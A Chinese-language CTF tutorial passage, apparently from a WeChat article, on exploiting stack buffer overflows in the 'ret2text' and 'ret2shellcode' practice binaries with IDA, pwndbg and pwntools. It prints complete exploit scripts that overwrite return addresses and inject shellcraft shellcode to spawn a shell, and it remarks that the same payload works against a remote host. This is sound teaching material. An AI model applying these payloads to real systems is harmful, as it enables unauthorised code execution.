![](https://mmbiz.qpic.cn/mmbiz_png/qEIz3N7qumib7IW4pYyZmXg5cgD0lylRpxUrRhribM2ZNnSO6FWKMDPPIGq4r8G6IAg6ac3nHkgrlHeRSdD0R4QA/640?wx_fmt=png)

打开后会是这样一个界面，因为这个界面是机器码，不容易看懂，使用快捷键`F5`来查看C语言的源码

![](https://mmbiz.qpic.cn/mmbiz_png/qEIz3N7qumib7IW4pYyZmXg5cgD0lylRpicx8BXoLMLVhyqice5GyZgwRx4NlRSia9GCBMGbgXwn821KJ0Jp1Xghew/640?wx_fmt=png)

点击页面中的任意一个数据，点击`F5`

![](https://mmbiz.qpic.cn/mmbiz_png/qEIz3N7qumib7IW4pYyZmXg5cgD0lylRpD0j7TyPR8CibXrFkyiadNianZLAetgz1bDRJJELibmcKC0JTCNEQiaIplAg/640?wx_fmt=png)

这个源码就是main函数中的，现在就依次进行分析

首先上面两行代码的意思是关闭缓冲区，使数据能够快速的进行调用

`puts()`就是输出语句

而下面的`vulnerable()`应该是写这个文件的人自己定义的

那我们做题的重点肯定是围绕这个`vulnerable()`函数来的

双击那个函数就可以查看这个函数中的源码

![](https://mmbiz.qpic.cn/mmbiz_png/qEIz3N7qumib7IW4pYyZmXg5cgD0lylRp4LGxIt0SDuoibMu4sFoDNiavMuxib67a76ENqgndiaW3Jj5WawNvtksZNQ/640?wx_fmt=png)

这个函数中写的是规定了`buffer`这个局部变量的字节数位8位，并且要将这8位数据压入栈中的，在这个后面也标明了esp栈顶和ebp栈底之间的距离

但是这样的表示是很难进行确定的，所以要使用动态调试`pwndbg`

![](https://mmbiz.qpic.cn/mmbiz_png/qEIz3N7qumib7IW4pYyZmXg5cgD0lylRpicBPMrCVZR2ibvBuj8kB2Fwm8Uc10gn7LmWiclGHwYCxBEJWCntkXWVdg/640?wx_fmt=png)

这个工具的使用和pychram中的debug是一样的作用，先进行打断点，然后一步一步进行查看

![](https://mmbiz.qpic.cn/mmbiz_png/qEIz3N7qumib7IW4pYyZmXg5cgD0lylRpPMYiabBia6q2ZOFZoEllI0beCdVMNUD3JnJZcL2wxQPPtm2yoGRJ8LHA/640?wx_fmt=png)

首先将断点打在`main`这个主函数中，然后一次运行

可以看到图中的绿色部分就相当属于之前分析调用函数时的`eip`指针(当前函数执行的指令)

然后蓝色横杠隔开的第一个区域是`RESISTERS`寄存器，这里面显示的就是此时执行直到的那一行的存储在寄存器中的值，第二个区域是`DISASM`反汇编代码，帮助我们查看在汇编代码中执行到了哪一步

所以在第一个区域与第二个区域也有相互关联的数据，就像第一段中的最后一行，写的是`eip`在mian函数偏移量为`+26`的地方，再看第二个区域的第一行，写的就是main+26，所以说这些数据都有相互所关联的数据

然后使用`n`来往下进行查看，要去看看刚才在ida中分析出来的`vulnerable`

![](https://mmbiz.qpic.cn/mmbiz_png/qEIz3N7qumib7IW4pYyZmXg5cgD0lylRptib6AFu2o9uibws7icJSO9lVTFKR51Tib5N3a2xTNbXo6RWvIWXzKxUcMA/640?wx_fmt=png)

可以看到当前的步骤是正在运行`vulnerable`的，所以这时就进入这个函数中来`查看、进行、执行`

因为前面在ida中分析到是栈溢出漏洞，所以进入后先检查断码，并且因为是栈溢出，则要查看esp与ebo之间的距离

可以分析道中间的间隔是16进制，现在就是要使用`pwntools`来进行漏洞的利用

  

那就先使用pwntools来连接并进行调试

1.先进行对文件的连接`io = process("文件名")`

![](https://mmbiz.qpic.cn/mmbiz_png/qEIz3N7qumib7IW4pYyZmXg5cgD0lylRpDc9aFUCBHlibdAbWicXVicicXChfvx1VQnyAYa19xIGapj1dcuZKMeVeDQ/640?wx_fmt=png)

2.因为在执行文件时，知道了文件会先输出一句话来对我们进行询问，并且我们要进行输入，所以在连接文件后，查看文件输出的完整内容`io.recv()`     `io.recvline()`输出一行内容

![](https://mmbiz.qpic.cn/mmbiz_png/qEIz3N7qumib7IW4pYyZmXg5cgD0lylRpzJwMDKaAvdRPwicictUrhrFzoAIbpUibgxLgaLJ6SXrLoBWvVs2Cj346w/640?wx_fmt=png)

3.接着就是输入内容`io.send()`

若是输入整数的格式，则要使用`p32()和p64()`p32是使用的32位，p64是使用的64位，将整数转换为字节数再进行传输

若是发送字符串的格式，则是要在字符串的前面加上`b"字符串"`

因为这个时候还没有对文件进行源码的分析，就先随便的进行输入数据

![](https://mmbiz.qpic.cn/mmbiz_png/qEIz3N7qumib7IW4pYyZmXg5cgD0lylRpmeMeO38A2zYuRicvavgBOJLqpZ9Yy32QxBKfyM3rQvpsGw4GO1o1Mcw/640?wx_fmt=png)

程序正常输出那句话，并且执行结束退出了

接着就进行payload的制作

因为在ida上分析了，esp与ebp的距离为20个字节】

> `payload = b"A" *16 + "BBBB" + p32(0x8048522)` #因为最开始就一直在说栈溢出最主要的就是return address返回地址，因为这个地址是会有一个执行权限的，所以我们在这里的返回地址覆盖为自己写的代码或者是其他函数的返回地址，因为在上面分析时，有一个get_shell函数的源码是可以直接进行利用的

![](https://mmbiz.qpic.cn/mmbiz_png/qEIz3N7qumib7IW4pYyZmXg5cgD0lylRpjZskOcBj979eLscq1UictaBpiaFZKfPaJax9xCibRvtQ08BPes7eibOibpg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/qEIz3N7qumib7IW4pYyZmXg5cgD0lylRpfNEhu1OFJiaIk7u71LwdmkiahQUAaC4NPzMWgdcskR7UlLg4GYHHibZpQ/640?wx_fmt=png)

将这个函数的地址写入`ret2text`中，在写入payload时，要使用`p32`四个字节

![](https://mmbiz.qpic.cn/mmbiz_png/qEIz3N7qumib7IW4pYyZmXg5cgD0lylRpgRuyes9Gm5tatHR9bLQy5y1y6ZAKAh0Wf9P6jP3AlibTODRrVUcattg/640?wx_fmt=png)

`io.interactive()`交互

使用后就能拿到一个shell会话

这样就相当于是攻击成功了，若是有靶机则就可以换成远程连接主机的方式，使用一样的payload进行攻击

最简单的方法就是将这一句一句的话写入python文件中，直接运行文件

```
from pwn import *  
io = process("ret2text")  
get_shell_addr = 0x8048522  
payload = b"A"*16 + b"BBBB" + p32(get_shell_addr)  
io.send(payload)  
io.interactive
```

  

实例4：ret2shellcode

![](https://mmbiz.qpic.cn/mmbiz_png/qEIz3N7qumib7IW4pYyZmXg5cgD0lylRpibfZ5Wp1IFpGme4bRxKnME5NxPd8Gso7jJb7xHmNJxickEuq0yWDDoTg/640?wx_fmt=png)

pwntools

工具中有一个模块有自带生成shellcode的

`shellcraft.sh()` #获取会话的shellcode，默认是32位的

可以使用print()输出shellcode

![](https://mmbiz.qpic.cn/mmbiz_png/qEIz3N7qumib7IW4pYyZmXg5cgD0lylRpeibxRiaslsHIw6VSPickxqn9icwZWyAdlGMrtKB7s43DwwlAhyibbenWPEA/640?wx_fmt=png)

这里输出的是汇编代码，但是我们在对栈中进行传输数据的时候要使用机器码，汇编代码只是用来给人进行方便读取的

要使用`print(asm(shellcraft.sh()))`

![](https://mmbiz.qpic.cn/mmbiz_png/qEIz3N7qumib7IW4pYyZmXg5cgD0lylRptmPfz8MaC82mhdiaSHAjnvbHd4xaFNXoqUggGet02iblwek9HWqU0kOw/640?wx_fmt=png)

现在所显示的就是机器码的数据了

但是要注意的是这写代码默认的是32位的机器

若是要攻击64位的机器，则命令为`print(shellcraft.amd64.sh())`

并且若是想要python认为自己攻击的是64为的机器则要将`context.arch = "amd64"`这个进行更改

![](https://mmbiz.qpic.cn/mmbiz_png/qEIz3N7qumib7IW4pYyZmXg5cgD0lylRpGKG3ibzEJAqeA4QwrjHsbhuAhdzrTCu5niapWOe1r6EIwIvGQiaCKaoQg/640?wx_fmt=png)

  

补充pwndbg `vmmap'`显示程序虚拟内存的空间分布

查看文件数据的属性

![](https://mmbiz.qpic.cn/mmbiz_png/qEIz3N7qumib7IW4pYyZmXg5cgD0lylRpL5j3xXjtwc3YQMG0gVpmxVnjUuH9E3c1WibicLichCYrOyWvEEEMuL5jw/640?wx_fmt=png)

补充C语言`strncpy()`

![](https://mmbiz.qpic.cn/mmbiz_png/qEIz3N7qumib7IW4pYyZmXg5cgD0lylRpWlqicspF3vOkOYm6Je7rHqAwicZ2v7zhdWibFYBnLxZCIGWk5ia17KT4Qw/640?wx_fmt=png)

将指定的字符复制到目标中

若是IDA工具中显示的位置与pwndbg中动态调试计算后的距离不同，那我们更应该相信的是动态调试后的数据

在IDA中我们可以看到变量`s`到ebp栈底的距离

![](https://mmbiz.qpic.cn/mmbiz_png/qEIz3N7qumib7IW4pYyZmXg5cgD0lylRpWicvcJKMLoebKbK2ibm79xEvHtMh7nhNxrpfKIeH0gNd7g0oaJ00kjoQ/640?wx_fmt=png)

可以看到图中`eax`的位置是我们写入值是显示的位置

`ebp`是栈底的位置，因为是逆序进行存储，所以是将栈底`ebp`的位置与`eax`的位置进行相减

![](https://mmbiz.qpic.cn/mmbiz_png/qEIz3N7qumib7IW4pYyZmXg5cgD0lylRp9fDQgABo06kY4vImwDbdCcMvBOQTRVAHsKvvQCh9t4GD0Sy7kW5MuQ/640?wx_fmt=png)

因为我们是想要覆盖`return address`的位置，但是在`s`变量上还有4个字节的长度是`堆栈帧指针`的位置，所以还要在108个字节的基础上再添加4个字节的长度，也就是`112`

当我们知道shellcode后，接着就是将shellcode写入，但是我们知道这个文件打开了一个防护，让我们无法直接将shellcode写入栈中，要将shellcode的数据先放入变量`s`中，再当`s`的值复制到`buf2`时返回的地址中

所以要先知道buf2的值，将这个值使用`p32`整数值进行传入

![](https://mmbiz.qpic.cn/mmbiz_png/qEIz3N7qumib7IW4pYyZmXg5cgD0lylRp15pE8sCEFmkqoF9qcWibTucYHVNFldPqsN0feoEwL3MAozfUtuc1C0Q/640?wx_fmt=png)

可以看到`buf2`在C语言程序中是被定义为了局部变量，所以直接将这个值写入

> return_addr = 0x0804A080

接着就是将shellcode写入变量`s`中

> payload = asm(shellcraft.sh()).ljust(112, b'A') + p32(return_addr)
> 
> //asm()是将汇编代码转为机器码
> 
> //.just([长度]，[输入的值])
> 
> 所以是将shellcode先进行写入，若是没有达到112个字节则，将输入的值进行写入

payload

```
from pwn import *  
a = process("ret2shellcode")  
addr = 0x0804A080  
payload = asm(shellcraft.sh()).ljust(112, b'A') + p32(addr)  
a.sendline(payload)  
a.interactive()
```

  

文章中涉及的题目可以关注公众号后询问后台。